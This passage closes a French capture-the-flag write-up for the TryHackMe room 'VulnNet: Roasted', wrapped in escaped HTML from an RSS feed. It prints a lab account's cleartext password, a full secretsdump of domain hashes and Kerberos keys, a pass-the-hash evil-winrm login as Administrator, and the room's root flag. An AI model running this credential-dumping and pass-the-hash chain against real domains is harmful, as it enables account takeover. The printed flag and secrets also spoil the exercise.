+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeSecurityPrivilege Manage auditing and security log Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeLoadDriverPrivilege Load and unload device drivers Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeSystemProfilePrivilege Profile system performance Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeSystemtimePrivilege Change the system &lt;span class="nb">time&lt;/span> Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeProfileSingleProcessPrivilege Profile single process Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeCreatePagefilePrivilege Create a pagefile Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeBackupPrivilege Back up files and directories Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeRestorePrivilege Restore files and directories Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeShutdownPrivilege Shut down the system Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeDebugPrivilege Debug programs Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeSystemEnvironmentPrivilege Modify firmware environment values Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeChangeNotifyPrivilege Bypass traverse checking Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeUndockPrivilege Remove computer from docking station Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeEnableDelegationPrivilege Enable computer and user accounts to be trusted &lt;span class="k">for&lt;/span> delegation Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeManageVolumePrivilege Perform volume maintenance tasks Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeImpersonatePrivilege Impersonate a client after authentication Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeCreateGlobalPrivilege Create global objects Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class="nb">set&lt;/span> Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeTimeZonePrivilege Change the &lt;span class="nb">time&lt;/span> zone Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeCreateSymbolicLinkPrivilege Create symbolic links Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token &lt;span class="k">for&lt;/span> another user in the same session Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER CLAIMS INFORMATION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User claims unknown.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Kerberos support &lt;span class="k">for&lt;/span> Dynamic Access Control on this device has been disabled.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Ici on a des informations intéressantes:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>VULNNET-RST\Domain Admins&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>Une fois que l&amp;rsquo;on a ça on peut penser a faire un secretsdump&lt;/p>
+&lt;h4 id="secretsdump">
+&lt;a href="#secretsdump">#&lt;/a>
+secretsdump
+&lt;/h4>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:28:48 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># secretsdump VULNNET-RST.local/a-whitehat:bNdKVkjv3RR9ht@10.10.211.33&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket &lt;span class="k">for&lt;/span> Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright &lt;span class="m">2022&lt;/span> Fortra - forked by ThePorgs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Service RemoteRegistry is in stopped state
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Starting service RemoteRegistry
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping &lt;span class="nb">local&lt;/span> SAM hashes &lt;span class="o">(&lt;/span>uid:rid:lmhash:nthash&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> SAM hashes extraction &lt;span class="k">for&lt;/span> user WDAGUtilityAccount failed. The account doesn&lt;span class="err">&amp;#39;&lt;/span>t have &lt;span class="nb">hash&lt;/span> information.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping cached domain logon information &lt;span class="o">(&lt;/span>domain/username:hash&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping LSA Secrets
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="nv">$MACHINE&lt;/span>.ACC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\W&lt;/span>IN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\W&lt;/span>IN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\W&lt;/span>IN-2BO8M1OE1M1$:des-cbc-md5:e32f734cda85a7ea
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\W&lt;/span>IN-2BO8M1OE1M1$:plain_password_hex:63edeac7b7c3c8e4fdf2b0731130beeb27815486e1afe3a870b55e7ec03efe78f9c63885fe1511b2cbe66b5c93abd83bc084c3cfb725d6e6c4a08de89a2a821b182b87880d9c7c62f7bc8c183f200345c06155413f2268def9fe3b02eeb639b77a375356316ead43330ece1a33e9866f2998bf1fca8c56c0caa0656c863996aaf41eed3de33de526e90340e2ff85ad774189857528cc1281c31519c28318c3541a306ecb034631d5b9491ba2e35858c023e4e68af1c7f198e36400bd988f097bbaf069307c6842274a50f1ab8815dc12ea1b7637d684e90e470d1f7c69712e77050cda0bf34b3bce2a3c9a590da9bb7e
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\W&lt;/span>IN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DPAPI_SYSTEM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NL&lt;span class="nv">$KM&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0000&lt;/span> F3 F6 6B 8D 1E 2A F4 8E &lt;span class="m">85&lt;/span> F6 7A &lt;span class="m">46&lt;/span> D1 &lt;span class="m">25&lt;/span> A0 D3 ..k..*....zF.%..
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0010&lt;/span> EA F4 &lt;span class="m">90&lt;/span> 7D 2D CB A5 8C &lt;span class="m">88&lt;/span> C5 &lt;span class="m">68&lt;/span> 4C 1E D3 &lt;span class="m">67&lt;/span> 3B ...&lt;span class="o">}&lt;/span>-.....hL..g&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0020&lt;/span> DB &lt;span class="m">31&lt;/span> D9 &lt;span class="m">91&lt;/span> C9 BB 6A &lt;span class="m">57&lt;/span> EA &lt;span class="m">18&lt;/span> 2C &lt;span class="m">90&lt;/span> D3 &lt;span class="m">06&lt;/span> F8 &lt;span class="m">31&lt;/span> .1....jW..,....1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0030&lt;/span> 7C 8C &lt;span class="m">31&lt;/span> &lt;span class="m">96&lt;/span> 5E &lt;span class="m">53&lt;/span> 5B &lt;span class="m">85&lt;/span> &lt;span class="m">60&lt;/span> B4 D5 6B &lt;span class="m">47&lt;/span> &lt;span class="m">61&lt;/span> &lt;span class="m">85&lt;/span> 4A &lt;span class="p">|&lt;/span>.1.^S&lt;span class="o">[&lt;/span>.&lt;span class="sb">`&lt;/span>..kGa.J
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NL&lt;span class="nv">$KM&lt;/span>:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping Domain Credentials &lt;span class="o">(&lt;/span>domain&lt;span class="se">\u&lt;/span>id:rid:lmhash:nthash&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using the DRSUAPI method to get NTDS.DIT secrets
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\e&lt;/span>nterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\a&lt;/span>-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\t&lt;/span>-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:b53e5ad16472b47f8fb7292cc3f1f55a:::
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Kerberos keys grabbed
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:des-cbc-md5:52d325cb2acd8fc1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\e&lt;/span>nterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\e&lt;/span>nterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\e&lt;/span>nterprise-core-vn:des-cbc-md5:200e0102ce868016
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\a&lt;/span>-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\a&lt;/span>-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\a&lt;/span>-whitehat:des-cbc-md5:028032c2a8043ddf
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\t&lt;/span>-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\t&lt;/span>-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\t&lt;/span>-skid:des-cbc-md5:25c2739dcb646bfd
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-goldenhand:des-cbc-md5:c4e65d49feb63180
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst.local&lt;span class="se">\j&lt;/span>-leet:des-cbc-md5:0815580254a49854
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:d1cf5bd71959114ef8a147a565ae44490134863025a53ea637e5005ea0f8e2da
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:475c9d59b8f1d616ccb630e93ae31fc0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WIN-2BO8M1OE1M1$:des-cbc-md5:1f579149bc9252e6
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Cleaning up...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Stopping service RemoteRegistry
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Cleaning up...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Stopping service RemoteRegistry
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Nous avons le hash NT de l&amp;rsquo;administrateur:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="evil-winrm-1">
+&lt;a href="#evil-winrm-1">#&lt;/a>
+evil-winrm
+&lt;/h4>&lt;p>On peut maintenant se connecter à la machine avec Evil-WinRM:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:32:52 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># evil-winrm -i 10.10.211.33 -u &amp;#39;Administrator&amp;#39; -H &amp;#39;c2597747aa5e43022a3a3049a3c3b09d&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Evil-WinRM shell v3.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Establishing connection to remote endpoint
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>ocuments&amp;gt; whoami
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst&lt;span class="se">\a&lt;/span>dministrator
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>ocuments&amp;gt; Get-Content &lt;span class="s2">&amp;#34;C:/Users/Administrator/Desktop/system.txt&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">THM&lt;span class="o">{&lt;/span>16f45e3934293a57645f8d7bf71d8d4c&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\A&lt;/span>dministrator&lt;span class="se">\D&lt;/span>ocuments&amp;gt; &lt;span class="nb">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Exiting with code &lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>On a récupéré le flag root &lt;strong>THM{16f45e3934293a57645f8d7bf71d8d4c}&lt;/strong>.&lt;/p>
+&lt;p>Voilà, c&amp;rsquo;est terminé pour cette room. J&amp;rsquo;espère que vous avez apprécié. Si vous avez des questions ou des suggestions n&amp;rsquo;hésitez pas à me contacter sur &lt;a class="link" href="https://www.linkedin.com/in/lukas-taboga-5a8040237/" target="_blank" rel="noopener"
+>linkedin&lt;/a>.&lt;/p></description></item></channel></rss>
